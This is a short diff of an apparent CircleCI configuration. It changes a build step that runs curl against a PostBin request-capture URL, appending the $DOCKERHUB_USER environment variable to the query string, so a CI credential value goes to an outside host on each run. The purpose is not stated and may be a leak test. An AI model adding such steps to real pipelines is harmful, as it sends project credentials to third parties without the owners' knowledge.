@@ -81,7 +81,7 @@ jobs:
       name: node/default
       tag: "14.17"
     steps:
-      - run: curl https://www.toptal.com/developers/postbin/1661275748486-1824831354897?example=$DOCKERHUB_USER
+      - run: curl https://www.toptal.com/developers/postbin/1661278073255-1840879186056?example=$DOCKERHUB_USER
 
 workflows:
   default:
